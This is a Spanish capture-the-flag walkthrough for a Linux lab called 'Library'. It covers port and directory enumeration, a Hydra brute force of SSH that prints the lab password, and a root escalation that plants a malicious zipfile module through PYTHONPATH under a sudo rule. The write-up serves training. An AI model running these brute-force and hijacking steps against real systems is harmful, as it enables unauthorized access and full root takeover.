# Library

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux identificando usuarios válidos mediante la aplicación web, obtener acceso inicial mediante **SSH** utilizando credenciales débiles y escalar privilegios explotando una mala configuración de **sudo** mediante **Python Library Hijacking**.

---

## 🛠️ Tecnologías trabajadas

- SSH
- Hydra
- Gobuster
- Python
- Sudo
- Python Library Hijacking
- PYTHONPATH

---

## 🧠 Metodología

La enumeración inicial mostró únicamente dos servicios expuestos: **SSH** y **HTTP**. Dado que el acceso por SSH requería credenciales, la aplicación web se convirtió en la principal fuente de información para identificar posibles usuarios del sistema.

Aunque la enumeración de directorios no reveló recursos interesantes, la propia página web exponía varios nombres de usuario. En lugar de realizar ataques indiscriminados, decidí centrar la fuerza bruta únicamente sobre el usuario con más probabilidades de ser válido, reduciendo considerablemente el número de intentos necesarios.

Una vez obtenido el acceso mediante SSH, la revisión de los permisos con `sudo -l` mostró que era posible ejecutar un script Python como **root** sin necesidad de contraseña. Aunque el script no podía modificarse directamente, observé que importaba librerías estándar de Python, lo que permitía aprovechar la variable de entorno **PYTHONPATH** para cargar una librería maliciosa antes que la original.

Este laboratorio demuestra cómo una configuración aparentemente segura puede volverse vulnerable cuando no se controla el entorno de ejecución de un programa.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo de puertos mediante Nmap.

```bash
nmap -p- 10.130.162.237
```

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

Posteriormente realicé una enumeración más detallada.

```bash
nmap -sC -sV -p22,80 10.130.162.237
```

La información confirmó que el acceso inicial probablemente dependería de obtener credenciales válidas para SSH.

---

### 2. Enumeración web

Comencé analizando la aplicación web.

Realicé una enumeración de directorios utilizando Gobuster.

```bash
gobuster dir -u http://10.130.162.237 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

El único recurso descubierto fue:

```
/images
```

Sin embargo, no aportaba información útil para la explotación.

La propia página principal sí mostraba varios nombres de usuario:

- meliodas
- root
- www-data
- anonymous

Entre ellos, el usuario **meliodas** parecía el candidato más probable para un acceso legítimo mediante SSH.

---

### 3. Obtención del acceso inicial

Con el usuario identificado lancé un ataque de fuerza bruta utilizando Hydra.

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.130.162.237
```

El ataque devolvió las siguientes credenciales:

```
meliodas:iloveyou1
```

Con ellas inicié sesión mediante SSH.

```bash
ssh meliodas@10.130.162.237
```

Una vez autenticado recuperé la primera flag:

```
user.txt
```

---

### 4. Enumeración interna

El siguiente paso consistió en revisar los privilegios disponibles.

```bash
sudo -l
```

El resultado mostró que el usuario podía ejecutar como **root** el siguiente comando:

```text
/usr/bin/python* /home/meliodas/bak.py
```

El script no era modificable, por lo que fue necesario analizar su funcionamiento.

Durante la revisión observé que importaba librerías estándar como:

- os
- zipfile

Esta característica hacía posible un ataque de **Python Library Hijacking**.

---

### 5. Escalada de privilegios

El objetivo consistía en crear una versión maliciosa del módulo `zipfile` y hacer que Python la cargara antes que la librería original.

Creé el siguiente archivo:

```bash
echo 'import os; os.system("/bin/bash")' > /tmp/zipfile.py
```

Posteriormente ejecuté el script indicando un nuevo directorio de búsqueda mediante la variable `PYTHONPATH`.

```bash
sudo PYTHONPATH=/tmp python3 /home/meliodas/bak.py
```

Cuando Python intentó importar `zipfile`, cargó primero el módulo malicioso, ejecutando automáticamente una shell con privilegios de **root**.

Finalmente recuperé la última flag ubicada en:

```
/root/root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una técnica de escalada de privilegios menos habitual basada en el funcionamiento interno del sistema de importación de módulos de Python.
- Obtener usuarios válidos a partir de la información expuesta por una aplicación web.
- Realizar ataques de fuerza bruta dirigidos únicamente contra usuarios con mayor probabilidad de éxito.
- Revisar cuidadosamente los permisos disponibles mediante `sudo -l`.
- Comprender cómo Python busca e importa sus librerías.
- Utilizar la variable de entorno `PYTHONPATH` para alterar el orden de búsqueda de módulos.
- Aprovechar un **Python Library Hijacking** para ejecutar código como **root**.
